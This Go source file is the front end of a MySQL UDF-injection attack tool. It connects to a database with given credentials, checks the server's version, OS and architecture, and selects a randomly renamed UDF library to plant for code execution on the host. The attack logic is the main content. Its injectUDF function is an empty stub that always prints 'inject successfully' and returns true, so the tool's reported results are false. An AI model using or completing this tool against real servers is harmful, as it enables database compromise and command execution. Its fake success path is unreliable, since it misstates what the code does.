package main

import (
	"flag"
	"fmt"
	"io/ioutil"

	"github.com/pelletier/go-toml"

	"github.com/For-ACGN/udf-injecter"
)

func main() {
	var (
		mode     string // "direct", "pma"(phpMyAdmin)
		host     string
		username string
		password string
		config   string
	)
	flag.StringVar(&mode, "m", "direct", "inject method: direct or pma")
	flag.StringVar(&host, "h", "127.0.0.1:3306", "MySQL Server address or phpMyAdmin URL")
	flag.StringVar(&username, "u", "root", "MySQL Server username")
	flag.StringVar(&password, "p", "", "MySQL Server password")
	flag.StringVar(&config, "c", "config.toml", "config file path")
	flag.Parse()
	// load config
	cfgData, err := ioutil.ReadFile(config)
	if err != nil {
		fmt.Print(err)
		return
	}
	cfg := struct {
		UDF  map[string]string
		Func []*injecter.Func
	}{}
	err = toml.Unmarshal(cfgData, &cfg)
	if err != nil {
		fmt.Print(err)
		return
	}
	// load UDFs
	udf := make(map[string]*injecter.UDF)
	for t, path := range cfg.UDF {
		data, err := ioutil.ReadFile(path)
		if err != nil {
			fmt.Print("load UDF failed:", err)
			return
		}
		udf[t] = &injecter.UDF{
			// "xxxxxxxx.xxx"
			Name: injecter.RandomStr(8) + "." + injecter.RandomStr(3),
			Data: data,
		}
		fmt.Printf("[+] load UDF: %s\n", t)
	}
	// connect host
	var handle injecter.Handle
	switch mode {
	case "direct":
		handle, err = injecter.Connect(host, username, password)
		if err != nil {
			fmt.Print("direct connect failed:", err)
			return
		}
		fmt.Printf("[+] direct connect %s\n", host)
	case "pma":
		fmt.Print("not support now")
		return
	default:
		fmt.Print("unknown inject mode")
		return
	}
	// start inject
	if len(udf) == 0 || len(cfg.Func) == 0 {
		fmt.Print("[-] no UDF or no Functions")
		return
	}
	if !injecter.IsDynamic(handle) {
		fmt.Print("[-] not dynamic")
		return
	}
	// select inject method
	version, err := injecter.GetVersion(handle)
	if err != nil {
		fmt.Println("[-]", err)
		return
	}
	fmt.Println("[+] version:", version)
	ver, err := injecter.ParseVersion(version)
	if err != nil {
		fmt.Println("[-]", err)
		return
	}
	// select inject udf
	os, err := injecter.GetOS(handle)
	if err != nil {
		fmt.Println("[-]", err)
		return
	}
	arch, err := injecter.GetMachine(handle)
	if err != nil {
		fmt.Println("[-]", err)
		return
	}
	fmt.Println("[+] OS & Arch:", os+"_"+arch)
	// match
	if udfData, ok := udf[os+"_"+arch]; ok {
		if ver < 501 {
			_ = injectUDF(handle, udfData, cfg.Func, false)
		} else {
			_ = injectUDF(handle, udfData, cfg.Func, true)
		}
		return
	}
	fmt.Println("[!] unmatched OS & Arch, attempt all UDF")
	for t, u := range udf {
		fmt.Println("[+] attempt", t)
		if ver < 501 { // version < 5.1.xx
			if injectUDF(handle, u, cfg.Func, false) {
				return
			}
		} else { // include MariaDB
			if injectUDF(handle, u, cfg.Func, true) {
				return
			}
		}
	}
	fmt.Println("[-] all attempts failed")
}

func injectUDF(handle injecter.Handle, udf *injecter.UDF, funcs []*injecter.Func, v51 bool) bool {
	fmt.Println("[*] inject successfully")
	return true
}
